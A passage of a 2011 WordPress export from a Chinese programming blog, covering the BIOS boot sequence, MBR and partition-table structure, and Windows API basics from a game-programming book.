	<li>read/write memory above 32K (unless 1234h found in reset word)——读写测试32K字节以上的内存（除非在复位字的位置找到1234h）</li>
	<li>addresses C800:0 through F400:0 are scanned in 2Kb blocks in search of valid ROM. If found, a far call to byte 3 of the ROM is executed.——以2K字节大小的块为单位，从c800:0到f400:0扫描，查找有效映射的ROM。找到后，对ROM的第3个字节进行远程调用。</li>
	<li>test ROM cassette BASIC (checksum test)——检测ROM BASIC（校验和测试，现在的BIOS已取消ROM BASIC了……）</li>
	<li>test for installed diskette drives &amp; ~FDC~ recalibration &amp; seek——检测安装了的硬盘驱动器、软盘控制器。</li>
	<li>test printer and RS-232 ports.  store printer port addresses at 400h and RS-232 port addresses at 408h.  store printer time-out values at 478h and Serial time-out values at 47Ch.——检测打印机口和RS-232串口。把打印口地址保存在内存的400h，串口地址保存在408h。打印机超时值保存在478h，串口超时值保存在47Ch。</li>
	<li>NMI interrupts are enabled——激活NMI中断</li>
	<li>perform ~INT 19~ (bootstrap loader), pass control to boot record or cassette BASIC if no bootable disk found——执行INT 19h（引导装载程序），把控制权转交给引导程序</li>
	<li>~WARM BOOT~ procedure is now executed——现在热启动已经执行完毕了</li>
</ol>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>116</wp:post_id>
		<wp:post_date>2011-10-08 18:44:01</wp:post_date>
		<wp:post_date_gmt>2011-10-08 10:44:01</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e7%b3%bb%e7%bb%9f%e5%bc%95%e5%af%bc%e8%bf%87%e7%a8%8b</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[13]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1318078619]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>boot</title>
		<link>http://codemylife.blogcn.com/2011/10/%e7%b3%bb%e7%bb%9f%e5%bc%95%e5%af%bc%e8%bf%87%e7%a8%8b/boot/</link>
		<pubDate>Sat, 08 Oct 2011 12:53:42 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp06/M00/03/46/wKgKDE6QR9YAAAAAAABEfBZYFVo123.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>120</wp:post_id>
		<wp:post_date>2011-10-08 20:53:42</wp:post_date>
		<wp:post_date_gmt>2011-10-08 12:53:42</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>boot</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>116</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp06/M00/03/46/wKgKDE6QR9YAAAAAAABEfBZYFVo123.jpg</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"382";s:6:"height";s:3:"358";s:14:"hwstring_small";s:23:"height='96' width='102'";s:5:"sizes";a:2:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp01/M00/01/F2/wKgKCk6QR9YAAAAAAAAMqy9spXI700.jpg";}s:6:"medium";a:3:{s:5:"width";s:3:"188";s:6:"height";s:3:"176";s:3:"url";s:73:"http://files.blogcn.com/wp04/M00/02/42/wKgKDE6QR9YAAAAAAAAgo1Oc3kA678.jpg";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp03/M00/02/82/wKgKCk6QR9YAAAAAAABEfDU2huw963.jpg";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>扩展分区</title>
		<link>http://codemylife.blogcn.com/2011/10/mbr%e5%8f%82%e8%80%83%e8%b5%84%e6%96%99%ef%bc%9a%e7%a1%ac%e7%9b%98%e7%9b%b8%e5%85%b3/%e6%89%a9%e5%b1%95%e5%88%86%e5%8c%ba/</link>
		<pubDate>Sat, 08 Oct 2011 13:31:39 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp01/M00/02/96/wKgKC06QULsAAAAAAABS5Eoy-2g090.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>122</wp:post_id>
		<wp:post_date>2011-10-08 21:31:39</wp:post_date>
		<wp:post_date_gmt>2011-10-08 13:31:39</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e6%89%a9%e5%b1%95%e5%88%86%e5%8c%ba</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>121</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp01/M00/02/96/wKgKC06QULsAAAAAAABS5Eoy-2g090.jpg</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"288";s:6:"height";s:3:"452";s:14:"hwstring_small";s:22:"height='96' width='61'";s:5:"sizes";a:2:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp02/M00/02/02/wKgKC06QULsAAAAAAAANrFTxPio369.jpg";}s:6:"medium";a:3:{s:5:"width";s:3:"119";s:6:"height";s:3:"188";s:3:"url";s:73:"http://files.blogcn.com/wp02/M00/02/7A/wKgKCk6QULsAAAAAAAAdfzXMuI4247.jpg";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp01/M00/02/96/wKgKC06QULsAAAAAAABS5DeXYpw228.jpg";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>MBR参考资料：硬盘相关</title>
		<link>http://codemylife.blogcn.com/2011/10/mbr%e5%8f%82%e8%80%83%e8%b5%84%e6%96%99%ef%bc%9a%e7%a1%ac%e7%9b%98%e7%9b%b8%e5%85%b3/</link>
		<pubDate>Sat, 08 Oct 2011 13:45:01 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category><![CDATA[杂记]]></category>

		<category domain="category" nicename="%e6%9d%82%e8%ae%b0"><![CDATA[杂记]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=121</guid>
		<description></description>
		<content:encoded><![CDATA[以下文字转自 <a href="http://www.moon-soft.com/program/bbs/readelite739329.htm">硬盘结构</a> 和 <a href="http://www.moon-soft.com/program/bbs/readelite739169.htm">硬盘分区</a>

<strong>一. 硬盘结构简介</strong>

1. 硬盘参数释疑
到目前为止, 人们常说的硬盘参数还是古老的 CHS (Cylinder/ Head/Sector)参数. 那么为什么要使用这些参数, 它们的意义是什么? 它们的取值范围是什么?

很久以前, 硬盘的容量还非常小的时候，人们采用与软盘类似的结构生产硬盘。也就是硬盘盘片的每一条磁道都具有相同的扇区数。由此 产生了所谓的3D参数 (Disk Geometry)、既磁头数(Heads)、 柱面数 (Cylinders)、扇区数(Sectors per track)以及相应的寻址方式。

其中：磁头数(Heads) 表示硬盘总共有几个磁头，也就是有几面盘片，最大为 256 (用 8 个二进制位存储)；柱面数(Cylinders) 表示硬盘每一面盘片上有几条磁道，最大为 1024 (用 10 个二进制位存储)；扇区数(Sectors per track) 表示每一条磁道上有几个扇区，最大为 63 (用 6 个二进制位存储)。

每个扇区一般是 512个字节，理论上讲这不是必须的，但好象没有取别的值的。

所以磁盘最大容量为：256 * 1024 * 63 * 512 / 1048576 = 8064 GB ( 1M = 1048576 Bytes ) 或硬盘厂商常用的单位：256 * 1024 * 63 * 512 / 1000000 = 8455 GB ( 1M = 1000000 Bytes ) 。

在 CHS 寻址方式中，磁头、柱面、扇区的取值范围分别为 0 到 Heads-1，0 到 Cylinders-1，1 到 Sectors per track (注意是从 1 开始)。在 CHS 寻址方式中, 有以下几种尺寸单位:
<ul>
	<li>扇区 (Sector)  = 512 字节 (一般情况下)</li>
	<li>磁道 (Track)   = (Sectors per track) 扇区</li>
	<li>柱面 (Cylinder)= (Sectors per track) * Heads 扇区</li>
</ul>
2. 基本 Int 13H 调用简介

BIOS Int 13H 调用是 BIOS 提供的磁盘基本输入输出中断调用，它可以完成磁盘(包括硬盘和软盘)的复位，读写，校验，定位，诊断，格式化等功能。它使用的就是 CHS 寻址方式，因此最大识能访问 8 GB 左右的硬盘 ( 本文中如不作特殊说明，均以 1M = 1048576 字节为单位)。

3. 现代硬盘结构简介

在老式硬盘中，由于每个磁道的扇区数相等，所以外道的记录密度要远低于内道，因此会浪费很多磁盘空间 (与软盘一样)。为了解决这一问题，进一步提高硬盘容量，人们改用等密度结构生产硬盘。也就是说，外圈磁道的扇区比内圈磁道多。采用这种结构后，硬盘不再具有实际的3D参数，寻址方式也改为线性寻址，即以扇区为单位进行寻址.

为了与使用3D寻址的老软件兼容 (如使用BIOS Int13H接口的软件)，在硬盘控制器内部安装了一个地址翻译器，由它负责将老式3D参数翻译成新的线性参数。这也是为什么现在硬盘的3D参数可以有多种选择的原因 (不同的工作模式，对应不同的3D参数，如 LBA、LARGE、NORMAL)。

4. 扩展 Int 13H 简介

虽然现代硬盘都已经采用了线性寻址，但是由于基本 Int 13H 的制约，使用 BIOS Int 13H 接口的程序，如 DOS 等还只能访问 8 G 以内的硬盘空间。为了打破这一限制，Microsoft 等几家公司制定了扩展 Int 13H 标准(Extended Int13H)，采用线性寻址方式存取硬盘，所以突破了 8 G 的限制,而且还加入了对可拆卸介质 (如活动硬盘) 的支持。

<strong>二. Boot Sector 结构简介</strong>

1. Boot Sector 的组成
Boot Sector 也就是硬盘的第一个扇区。它由 MBR (Master Boot Record)、DPT (Disk Partition Table) 和 Boot Record ID  三部分组成。

MBR 又称作主引导记录，占用 Boot Sector 的前 446 个字节 ( 0 to 0x1BD )，存放系统主引导程序 (它负责从活动分区中装载并运行系统引导程序)。

DPT 即主分区表占用 64 个字节 (0x1BE to 0x1FD)，记录了磁盘的基本分区信息。主分区表分为四个分区项，每项 16 字节， 分别记录了每个主分区的信息 (因此最多可以有四个主分区)。

Boot Record ID 即引导区标记占用两个字节 (0x1FE and 0x1FF)，对于合法引导区，它等于 0xAA55，这是判别引导区是否合法的标志.。

2. 分区表结构简介

分区表由四个分区项构成, 每一项的结构如下:
<table border="1" width="500" bordercolor="#9999FF">
<tbody>
<tr>
<td width="20"><span style="color: #0000ff;">BYTE State </span></td>
<td width="200" align="center"><span style="color: #000000;">分区状态, 0 = 未激活, 0x80 = 激活 (注意此项) </span></td>
</tr>
<tr>
<td width="20"><span style="color: #0000ff;">BYTE StartHead</span></td>
<td width="200" align="center"><span style="color: #000000;">分区起始磁头号 </span></td>
</tr>
<tr>
<td width="20"><span style="color: #0000ff;">WORD StartSC</span></td>
<td width="200" align="center"><span style="color: #000000;">分区起始扇区和柱面号, 底字节的低6位为扇区号,
高2位为柱面号的第 9,10 位, 高字节为柱面号的低 8 位 </span></td>
</tr>
<tr>
<td width="20"><span style="color: #0000ff;">BYTE Type </span></td>
<td width="200" align="center"><span style="color: #000000;">分区类型, 如 0x0B = FAT32, 0x83 = Linux 等,
00 表示此项未用 </span></td>
</tr>
<tr>
<td width="20"><span style="color: #0000ff;">BYTE EndHead</span></td>
<td width="200" align="center"><span style="color: #000000;">分区结束磁头号</span></td>
</tr>
<tr>
<td width="20"><span style="color: #0000ff;">WORD EndSC</span></td>
<td width="200" align="center"><span style="color: #000000;">分区结束扇区和柱面号, 定义同前</span></td>
</tr>
<tr>
<td width="20"><span style="color: #0000ff;">DWORD Relative</span></td>
<td width="200" align="center"><span style="color: #000000;">在线性寻址方式下的分区相对扇区地址
(对于基本分区即为绝对地址) </span></td>
</tr>
<tr>
<td width="20"><span style="color: #0000ff;">DWORD Sectors</span></td>
<td width="200" align="center"><span style="color: #000000;"> 分区大小 (总扇区数) </span></td>
</tr>
</tbody>
</table>
注意：在 DOS / Windows 系统下，基本分区必须以柱面为单位划分 ( Sectors * Heads 个扇区)，如对于 CHS 为 764/256/63 的硬盘，分区的 最小尺寸为  256 * 63 * 512 / 1048576 = 7.875 MB。

由于硬盘的第一个扇区已经被引导扇区占用，所以一般来说，硬盘第一 个磁道(0头0道)的其余 62 个扇区是不会被分区占用的。 某些分区软件甚至将第一个柱面全部空出来。

3. 扩展分区简介

由于主分区表中只能分四个分区，无法满足需求，因此设计了一种扩展分区格式。基本上说，扩展分区的信息是以链表形式存放的，但也有一些特别的地方.

首先，主分区表中要有一个基本扩展分区项，所有扩展分区都隶属于它，也就是说其他所有扩展分区的空间都必须包括在这个基本扩展分区中。对于 DOS / Windows 来说，扩展分区的类型为 0x05 或 0x0F (LBA模式)。

除基本扩展分区以外的其他所有扩展分区则以链表的形式级联存放，后一个扩展分区的数据项记录在前一个扩展分区的分区表中，但两个扩展分区的空间并不重叠。

扩展分区类似于一个完整的硬盘，必须进一步分区才能使用。但每个扩展分区中只能存在一个其他分区，此分区在DOS/Windows 环境中即为逻辑盘。因此每一个扩展分区的分区表 (同样存储在扩展分区的第一个扇区中)中最多只能有两个分区数据项(包括下一个扩展分区的数据项)。

图示：
<img src="http://files.blogcn.com/wp01/M00/02/96/wKgKC06QULsAAAAAAABS5Eoy-2g090.jpg" alt="扩展分区" />

<strong>三、硬盘分区基础</strong>

通常，在PC机上使用的硬盘有两种：
<ol>
	<li>IDE接口：最常见的；</li>
	<li>SCSI接口：比IDE性能好，但更贵！</li>
</ol>
硬盘分区是针对一个硬盘进行操作的，它可以分为：主分区、扩展分区、逻辑分区。其中主分区可以是1-3个，扩展分区可以有0-1个，逻辑分区则没有什么限制。

主分区与扩展分区是平级的，扩展分区本身无法用来存放数据，要使用它必须将其分成若干个（1-n个）逻辑分区。

一个硬盘能够分成4个主分区、3个主分区1个扩展分区、2个主分区1个扩展分区、1个主分区1个扩展分区（只安装Windows系统的用户大多是使用这种方法）。

当然，如果你愿望只分一个主分区、或两个主分区，没有扩展分区也是可以的。

也就是说，不管什么操作系统，能够直接使用的只有主分区、逻辑分区。不过不同的操作系统使用的文件系统格式不同，因此在用于不同操作系统后，分区又有了一些新名字：早版本MSDOS使用的FAT16分区、Windows使用的FAT32分区、Windows NT使用的NTFS分区、Linux使用的Ext2分区及Swap分区……等等。

好了，现在我们来看看具体操作系统中是如何使用这些分区的：

1、Windows下的分区

在Windows下，使用“盘符”，如A、B、C、D、E……等还表示一个分区。这种方法使得硬盘分区这一东西变得十分简单。其中A和B是软驱，硬盘分区是从C开始编号的。对于Windows而言，它只能够使用一个主分区（在FDISK，称为主DOS分区），可以使用多个逻辑分区。

2、Linux下的分区

而在Linux下，则复杂一些了。首先，它对每一个设备进行了命名：

IDE设备：一台PC上可以有两个IDE接口（我将其称为第一IDE、第二IDE），而每个IDE接口上可以接两个IDE设备（我将其称为主盘、从盘）。其中硬盘与光驱都是IDE设备。Linux这样为其命名：

第一IDE的主盘：/dev/hda
第一IDE的从盘：/dev/hdb
第二IDE的主盘：/dev/hdc
第二IDE的从盘：/dev/hdd

看到这里，就别问我我的光驱在哪了？！

SCSI设备：这个相对大家会陌生一些，它通常需要加上一块SCSI卡来驱动。第一块SCSI设备称为：/dev/sda、第二块就是/dev/sdb……以此类推。

为什么都有一个“/dev”呢，这是因为，在UNIX/LINUX系统中，将所有的设备都当做一个文件，放在/dev目录下。

Linux下的分区命名

也就是主分区（或扩展分区）被命名为hda1-hda4，如果没有，就跳过。而扩展分区中的逻辑分区则从hda5开始编号，以此类推。注意了，这里是以第一IDE的主盘为例，如果是第二硬盘，就是hdb1、hdb2、hdb5、hdb6、hdb7。

到此，我们可以发现，Windows下不管有多少个IDE设备都是顺序地分配盘符，而在Linux下是认真区分对待每一个硬盘的。

3、启动系统：

每个硬盘的逻辑第1扇区中存放着MBR（主引导记录），这里就包括了主分区和扩展分区信息，当机器启动后，将引导交给硬盘时，就首先执行MBR上的程序，然后找到活动分区，启动操作系统。象LILO、OS Loader等多引导工具都是通过改写MBR来实现的。因此，当大家在安装完Linux后，将LILO写在MBR上，再安装Windows 9x，那么MBR就改写成为了Windows 9x的！]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>121</wp:post_id>
		<wp:post_date>2011-10-08 21:45:01</wp:post_date>
		<wp:post_date_gmt>2011-10-08 13:45:01</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>mbr%e5%8f%82%e8%80%83%e8%b5%84%e6%96%99%ef%bc%9a%e7%a1%ac%e7%9b%98%e7%9b%b8%e5%85%b3</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[9]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1318081503]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>Windows 编程一览（上）</title>
		<link>http://codemylife.blogcn.com/2011/10/windows%e7%bc%96%e7%a8%8b%e4%b8%80%e8%a7%88/</link>
		<pubDate>Sun, 09 Oct 2011 13:12:17 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category domain="tag"><![CDATA[Windows]]></category>

		<category domain="tag" nicename="windows"><![CDATA[Windows]]></category>

		<category><![CDATA[Windows 游戏编程大师技巧]]></category>

		<category domain="category" nicename="tricks-of-the-windows-game-progrmming"><![CDATA[Windows 游戏编程大师技巧]]></category>

		<category><![CDATA[读书]]></category>

		<category domain="category" nicename="%e8%af%bb%e4%b9%a6"><![CDATA[读书]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=124</guid>
		<description></description>
		<content:encoded><![CDATA[历史不是简单的重复，但却有惊人的相似。

开始学习《Windows 游戏编程大师技巧》这本书，此篇是对前4章所讲Windows编程知识的简单回顾。

<strong>窗口类：</strong>

[c]
typedef struct {
    UINT cbSize;
    UINT style;
    WNDPROC lpfnWndProc;
    int cbClsExtra;
    int cbWndExtra;
    HINSTANCE hInstance;
    HICON hIcon;
    HCURSOR hCursor;
    HBRUSH hbrBackground;
    LPCTSTR lpszMenuName;
    LPCTSTR lpszClassName;
    HICON hIconSm;
} WNDCLASSEX, *PWNDCLASSEX;
[/c]


style字段常用如下，在DiretX程序中，一般只用CS_DBLCLKS：
<table border="1" width="550" bordercolor="#9999FF">
<tbody>
<tr>
<td width="20" bgcolor="#9999FF"><span style="color: #ffffff;">标识</span></td>
<td width="200" bgcolor="#9999FF"><span style="color: #ffffff;">描述</span></td>
</tr>
<tr>
<td width="20"><span style="color: #000000;">CS_HREDRAW</span></td>
<td width="200" align="center"><span style="color: #000000;">若移动或改变了窗口宽度，则刷新整个窗口</span></td>
</tr>
<tr>
<td width="20"><span style="color: #000000;">CS_VREDRAW</span></td>
<td width="200" align="center"><span style="color: #000000;">若移动或改变了窗口高度，则刷新整个窗口</span></td>
</tr>
<tr>
<td width="20"><span style="color: #000000;">CS_OWNDC</span></td>
<td width="200" align="center"><span style="color: #000000;">为该类中每个窗口分配一个单值的设备描述表</span></td>
</tr>
<tr>
<td width="20"><span style="color: #000000;">CS_DBLCLKS</span></td>
<td width="200" align="center"><span style="color: #000000;">当用户双击鼠标时向窗口程序发送一个双击的消息，同时，光标位于属于该类的窗口中</span></td>
</tr>
<tr>
<td width="20"><span style="color: #000000;">CS_PARENTDC</span></td>
<td width="200" align="center"><span style="color: #000000;">在父窗口中设定一个子窗口的裁剪区，以便于子窗口能够画在父窗口中</span></td>
</tr>
<tr>
<td width="20"><span style="color: #000000;">CS_SAVEBITS</span></td>
<td width="200" align="center"><span style="color: #000000;">在一个窗口中保存用户图像，以便于在该窗口被遮住、移动时不必每次刷新屏幕。但是，这样会占用更多的内存，并且比人工同样操作要慢得多</span></td>
</tr>
<tr>
<td width="20"><span style="color: #000000;">CS_NOCLOSE</span></td>
<td width="200" align="center"><span style="color: #000000;">禁止系统菜单上的关闭命令</span></td>
</tr>
</tbody>
</table>
hInstance是启动时传递给WinMain函数的hInstance，是应用程序的实例（ps：在WinMain函数之外可以使用GetModuleHandle(NULL)来获取）。

使用 LoadIcon 和  LoadCursor 可以加载图标和光标，使用系统内置或者自定义。brBackground 字段在DirectX程序中一般置为NULL。

<strong>创建窗口：</strong>

[c]
HWND CreateWindowEx(
    DWORD dwExStyle,
    LPCTSTR lpClassName,
    LPCTSTR lpWindowName,
    DWORD dwStyle,
    int x,
    int y,
    int nWidth,
    int nHeight,
    HWND hWndParent,
    HMENU hMenu,
    HINSTANCE hInstance,
    LPVOID lpParam
);
[/c]


dwStyle 字段标识了窗口外观或行为：

[c]
#define WS_OVERLAPPED       0x00000000L //带有标题栏和边界的重叠式窗口
#define WS_POPUP            0x80000000L //弹出式窗口
#define WS_CHILD            0x40000000L
#define WS_MINIMIZE         0x20000000L //开始就最小化的窗口
#define WS_VISIBLE          0x10000000L //开始就可见的窗口
#define WS_DISABLED         0x08000000L
#define WS_CLIPSIBLINGS     0x04000000L
#define WS_CLIPCHILDREN     0x02000000L //子窗口区域父窗口就不负责绘制
#define WS_MAXIMIZE         0x01000000L //开始就最大化的窗口
#define WS_CAPTION          0x00C00000L //WS_BORDER | WS_DLGFRAME
#define WS_BORDER           0x00800000L //有细线边界的窗口
#define WS_DLGFRAME         0x00400000L
#define WS_VSCROLL          0x00200000L
#define WS_HSCROLL          0x00100000L
#define WS_SYSMENU          0x00080000L //标题栏上有窗口菜单的窗口
#define WS_THICKFRAME       0x00040000L
#define WS_GROUP            0x00020000L
#define WS_TABSTOP          0x00010000L
//最大化最小化按钮
#define WS_MINIMIZEBOX      0x00020000L
#define WS_MAXIMIZEBOX      0x00010000L
//同义
#define WS_TILED            WS_OVERLAPPED
#define WS_ICONIC           WS_MINIMIZE
#define WS_SIZEBOX          WS_THICKFRAME
#define WS_TILEDWINDOW      WS_OVERLAPPEDWINDOW
//常用窗口
#define WS_OVERLAPPEDWINDOW (WS_OVERLAPPED     | \
                             WS_CAPTION        | \
                             WS_SYSMENU        | \
                             WS_THICKFRAME     | \
                             WS_MINIMIZEBOX    | \
                             WS_MAXIMIZEBOX)
#define WS_POPUPWINDOW      (WS_POPUP          | \
                             WS_BORDER         | \
                             WS_SYSMENU)
#define WS_CHILDWINDOW      (WS_CHILD)
[/c]


<strong>实时事件循环：</strong>

[c]
MSG msg;
while (true) {
    if (PeekMessage(&amp;msg, NULL, 0, 0, PM_REMOVE)) {
        if (msg.message == WM_QUIT)
            break;
        //parse msg
	TranslateMessage(&amp;msg);
        DispatchMessage(&amp;msg);
    }
    else {
        //do your code here
    }
}
[/c]


<strong>播放.wav文件</strong>

[c]
//函数原型
BOOL PlaySound(LPCSTR pszSound,  HMODULE hmod, DWORD fdwSound);
//示例
//播放一次
PlaySound(&quot;soundCreate&quot;, hinstance, SND_RESOURCE | SND_SYNC);
//循环播放
PlaySound(&quot;soundMusic&quot;, hinstance, SND_RESOURCE | SND_ASYNC | SND_LOOP);
[/c]


<strong>GDI 简介：</strong>
WM_PAINT消息对于 GDI 图形和 Windows 编程很重要，可以是用BeginPaint()、EndPaint() 之间绘图，但是有一个问题，只能访问需要刷新的该用户区的一部分，详见<a href="http://codemylife.blogcn.com/2011/06/%E5%85%B3%E4%BA%8Ewm_pant%E6%B6%88%E6%81%AF%E7%9A%84%E5%A4%84%E7%90%86/">关于WM_PANT消息的处理</a>。

可以用如下方式处理：

[c]
case WM_PAINT:
    hdc = GetDC(hwnd);
    //do your code here
    ReleaseDC(hwnd, hdc);
    GetClientRect(hwnd, &amp;rect);
    ValidateRect(hwnd, &amp;rect);
    return 0;
[/c]

也可在调用BeginPaint()、EndPaint() 之前调用 InvalidateRect()，之后在调用 BeginPaint() 时，该无效区域反应出原本无效区域和使用 InvalidateRect() 添加无效区域的并集。大多数情况下，直接使InvalidateRect() 的 lpRect设定为NULL，直接使整个窗口无效。

<strong>视频显示基础和色彩</strong>
术语：
<ul>
	<li>像素：光栅式显示设备（如计算机显示器）上的单个可寻址的图像元素（图元）。</li>
	<li>分辨率：显卡支持的像素数，如640*480、800*600等。分辨率越高，图像质量越好，但也需要越多的显存。</li>
	<li>颜色深度（色度）：代表屏幕上每一个像素的位数或字节数，即每位像素的位数（Bit-per-bit, BPP）。如，一个像素用8位（一个字节来表示），则只能显示256种颜色。颜色越深，占用内存越多。</li>
	<li>隔行扫描/逐行扫描显示：扫描电子枪一次所画的计算机显示一行称为扫描线符，故名光栅化（Rasterization）。标准电视机分两桢画出一个画面，一帧包括全部的奇数扫描行，一帧包括全部的偶数扫描行。当隔行扫描时，你通常可以看到闪烁和抖动。</li>
	<li>视频RAM：显卡上的内存容量，用于存储和表示屏幕或贴图内存中的视频图像。</li>
	<li>刷新速率：每秒钟视频图像的刷新次数。以 HZ （赫兹） 或 fps（每秒的桢数）作为计量单位。</li>
	<li>2D 加速：显卡上的硬件支持，能协助Windows或DirextX进行2D操作，如位图图形、线、圆、文本和图像缩放等。</li>
	<li>3D加速：显卡上的硬件支持，能协助Windows或DirextX/Direct3D进行3D图形渲染。</li>
</ul>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>124</wp:post_id>
		<wp:post_date>2011-10-09 21:12:17</wp:post_date>
		<wp:post_date_gmt>2011-10-09 13:12:17</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>windows%e7%bc%96%e7%a8%8b%e4%b8%80%e8%a7%88</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[5]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1343359022]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
